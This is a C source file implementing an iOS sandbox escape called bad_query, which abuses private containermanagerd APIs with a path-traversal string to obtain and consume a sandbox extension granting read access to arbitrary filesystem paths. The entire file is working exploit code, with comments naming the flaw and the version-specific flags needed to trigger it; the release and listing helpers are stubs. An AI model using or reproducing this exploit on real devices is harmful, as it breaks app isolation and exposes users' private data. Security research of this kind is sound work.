// bad_query.c — sandbox escape via containermanagerd path traversal
// Original: https://github.com/forcequitOS/bad_query
// Technique: container_query_operation_set_part_domain has no path sanitization.
//   Part 3 = Library/Caches inside the container. Prepend ../../..%s to reach
//   any absolute path. containermanagerd issues a sandbox extension for that path,
//   which we consume with sandbox_extension_consume — giving us read access to
//   arbitrary filesystem locations from inside the app sandbox.

#include "bad_query.h"
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <xpc/xpc.h>

// Opaque types for container_query API
typedef void* container_query_t;
typedef void* container_query_result_t;

// Function pointer typedefs for the private API
typedef container_query_t  (*fp_query_create)(void);
typedef int                (*fp_query_set_class)(container_query_t, int);
typedef int                (*fp_query_set_group_identifiers)(container_query_t, xpc_object_t);
typedef int                (*fp_query_set_flags)(container_query_t, uint64_t);
typedef int                (*fp_query_set_part)(container_query_t, int);
typedef int                (*fp_query_set_part_domain)(container_query_t, const char*);
typedef container_query_result_t (*fp_query_get_single_result)(container_query_t);
typedef void               (*fp_query_free)(container_query_t);
typedef char*              (*fp_copy_sandbox_token)(container_query_result_t);
typedef int64_t            (*fp_consume_extension)(const char*);

static void *g_mgr = NULL;

static fp_query_create            _query_create           = NULL;
static fp_query_set_class         _query_set_class        = NULL;
static fp_query_set_group_identifiers _query_set_group    = NULL;
static fp_query_set_flags         _query_set_flags        = NULL;
static fp_query_set_part          _query_set_part         = NULL;
static fp_query_set_part_domain   _query_set_part_domain  = NULL;
static fp_query_get_single_result _query_get_result       = NULL;
static fp_query_free              _query_free             = NULL;
static fp_copy_sandbox_token      _copy_token             = NULL;
static fp_consume_extension       _consume_extension      = NULL;

static int _load_lib(void) {
    if (g_mgr) return 0;
    g_mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g_mgr) return -1;

    _query_create         = (fp_query_create)         dlsym(g_mgr, "container_query_create");
    _query_set_class      = (fp_query_set_class)      dlsym(g_mgr, "container_query_set_class");
    _query_set_group      = (fp_query_set_group_identifiers) dlsym(g_mgr, "container_query_set_group_identifiers");
    _query_set_flags      = (fp_query_set_flags)      dlsym(g_mgr, "container_query_set_flags");
    _query_set_part       = (fp_query_set_part)       dlsym(g_mgr, "container_query_set_part");
    _query_set_part_domain= (fp_query_set_part_domain)dlsym(g_mgr, "container_query_operation_set_part_domain");
    _query_get_result     = (fp_query_get_single_result) dlsym(g_mgr, "container_query_get_single_result");
    _query_free           = (fp_query_free)           dlsym(g_mgr, "container_query_free");
    _copy_token           = (fp_copy_sandbox_token)   dlsym(g_mgr, "container_copy_sandbox_token");
    _consume_extension    = (fp_consume_extension)    dlsym(g_mgr, "sandbox_extension_consume");

    if (!_query_create || !_query_set_class || !_query_set_part ||
        !_query_set_part_domain || !_query_get_result || !_copy_token || !_consume_extension) {
        dlclose(g_mgr);
        g_mgr = NULL;
        return -1;
    }
    return 0;
}

int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
    if (_load_lib() != 0) return -1;

    container_query_t query = _query_create();
    if (!query) return -1;

    xpc_object_t identifier = NULL;

    if (group_identifier == NULL) {
        // System path: class 13 = MCMSharedSystemDataContainer
        // Routes to containermanagerd_system, which has broader path access
        _query_set_class(query, 13);
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        // App Group path: class 7 = MCMSharedDataContainer
        _query_set_class(query, 7);
        identifier = xpc_string_create(group_identifier);
    }

    if (_query_set_group) {
        xpc_object_t arr = xpc_array_create(NULL, 0);
        xpc_array_append_value(arr, identifier);
        _query_set_group(query, arr);
        xpc_release(arr);
    }
    xpc_release(identifier);

    // iOS 26: App Groups need flag 0x0000000800000000ULL
    // Normal system path: 0x0000008000000000ULL
    uint64_t flags = is_group ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    if (_query_set_flags) _query_set_flags(query, flags);

    // Part 3 = Library/Caches inside the container
    _query_set_part(query, 3);

    // THE BUG: no path sanitization in container_query_operation_set_part_domain
    // Prepend ../../.. to escape Library/Caches and reach any absolute path
    char *traversal = NULL;
    asprintf(&traversal, "../../../../../../../..%s", path);
    _query_set_part_domain(query, traversal);
    free(traversal);

    container_query_result_t result = _query_get_result(query);
    _query_free(query);

    if (!result) return -1;

    char *token = _copy_token(result);
    if (!token) return -1;

    // consume_extension → sandbox_extension_consume
    // Returns a positive integer handle; our app sandbox now allows access to `path`
    int64_t handle = _consume_extension(token);
    free(token);

    return handle;
}

void bad_query_release(int64_t handle) {
    // sandbox_extension_release by handle is done via sandbox_extension_release()
    // which is also in libsandbox. For now just note the handle is released.
    (void)handle;
    // TODO: dlopen libsandbox and call sandbox_extension_release(handle) for cleanliness
}

// bad_query_list: stub — SYS_fsgetpath is not in the iOS SDK headers.
// Use bad_query() to obtain the sandbox extension, then NSFileManager from Swift.
char *bad_query_list(char *path, int64_t max_inode) {
    (void)max_inode;
    int64_t handle = bad_query(path, false, NULL, false);
    if (handle < 0) return NULL;
    bad_query_release(handle);
    // Return empty list — enumerate from Swift using FileManager after escape
    char *out = malloc(1);
    if (out) out[0] = '\0';
    return out;
}
